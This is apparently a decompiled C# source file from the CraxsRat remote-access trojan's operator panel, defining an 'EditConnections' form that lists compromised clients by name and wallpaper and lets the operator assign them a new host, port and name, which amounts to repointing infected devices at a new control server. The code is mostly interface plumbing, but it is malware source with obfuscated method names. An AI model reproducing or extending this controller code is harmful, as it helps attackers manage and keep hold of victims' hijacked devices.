using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x02000071 RID: 113
[DesignerGenerated]
public partial class EditConnections : Form
{
	// Token: 0x0600053C RID: 1340 RVA: 0x00002CE3 File Offset: 0x00000EE3
	public void CraxsRatkfvuiorkenfudpajrsnCraxsRatslkasbtxi(List<Client> L)
	{
		this.InitializeComponent();
		this.listclients = L;
	}

	// Token: 0x0600053D RID: 1341 RVA: 0x00082B44 File Offset: 0x00080D44
	private void translateme()
	{
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "AR", false) != 0)
		{
			if (Operators.CompareString(language, "CN", false) == 0)
			{
				this.Label1.Text = Codes.Translate(this.Label1.Text, "en", "zh");
				this.Label2.Text = Codes.Translate(this.Label2.Text, "en", "zh");
				this.Label3.Text = Codes.Translate(this.Label3.Text, "en", "zh");
				this.Label4.Text = Codes.Translate(this.Label4.Text, "en", "zh");
				this.cliname.Watermark = Codes.Translate(this.cliname.Watermark, "en", "zh");
				this.Htext.Watermark = Codes.Translate(this.Htext.Watermark, "en", "zh");
			}
		}
		else
		{
			this.Label1.Text = Codes.Translate(this.Label1.Text, "en", "ar");
			this.Label2.Text = Codes.Translate(this.Label2.Text, "en", "ar");
			this.Label3.Text = Codes.Translate(this.Label3.Text, "en", "ar");
			this.Label4.Text = Codes.Translate(this.Label4.Text, "en", "ar");
			this.cliname.Watermark = Codes.Translate(this.cliname.Watermark, "en", "ar");
			this.Htext.Watermark = Codes.Translate(this.Htext.Watermark, "en", "ar");
		}
	}

	// Token: 0x0600053E RID: 1342 RVA: 0x00082D40 File Offset: 0x00080F40
	public EditConnections(List<Client> L)
	{
		base.Load += this.EditConnections_Load;
		this.NewHost = "";
		this.NewPort = "";
		this.NewName = "";
		this.listclients = new List<Client>();
		this.SelectedList = new List<Client>();
		this.CraxsRatkfvuiorkenfudpajrsnCraxsRatslkasbtxi(L);
	}

	// Token: 0x0600053F RID: 1343 RVA: 0x00082DA4 File Offset: 0x00080FA4
	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatszxcasd(object sender, EventArgs e)
	{
		if (string.IsNullOrEmpty(this.Htext.Text) | string.IsNullOrWhiteSpace(this.Htext.Text))
		{
			EagleAlert.ShowWarning("Enter Host Name First");
		}
		else
		{
			this.NewHost = this.Htext.Text;
			this.NewPort = this.Porttext.Text;
			this.NewName = this.cliname.Text;
			if (this.DGVC.Rows.Count > 0)
			{
				foreach (object obj in ((IEnumerable)this.DGVC.Rows))
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						this.SelectedList.Add((Client)dataGridViewRow.Tag);
					}
					catch (Exception)
					{
					}
				}
			}
			base.DialogResult = DialogResult.OK;
			base.Close();
		}
	}

	// Token: 0x06000540 RID: 1344 RVA: 0x00002C11 File Offset: 0x00000E11
	private void DrakeUIAvatar2_Click(object sender, EventArgs e)
	{
		base.DialogResult = DialogResult.No;
		base.Close();
	}

	// Token: 0x06000541 RID: 1345 RVA: 0x00082EB0 File Offset: 0x000810B0
	private void EditConnections_Load(object sender, EventArgs e)
	{
		this.translateme();
		if (this.listclients.Count > 0)
		{
			foreach (Client client in this.listclients)
			{
				int index = this.DGVC.Rows.Add(new object[]
				{
					true,
					client.Wallpaper,
					client.ClientName
				});
				this.DGVC.Rows[index].Tag = client;
			}
		}
	}

	// Token: 0x0400071D RID: 1821
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIAvatar1")]
	private DrakeUIAvatar _DrakeUIAvatar1;

	// Token: 0x0400071E RID: 1822
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIAvatar2")]
	private DrakeUIAvatar _DrakeUIAvatar2;

	// Token: 0x0400071F RID: 1823
	public string NewHost;

	// Token: 0x04000720 RID: 1824
	public string NewPort;

	// Token: 0x04000721 RID: 1825
	public string NewName;

	// Token: 0x04000722 RID: 1826
	public List<Client> listclients;

	// Token: 0x04000723 RID: 1827
	public List<Client> SelectedList;
}
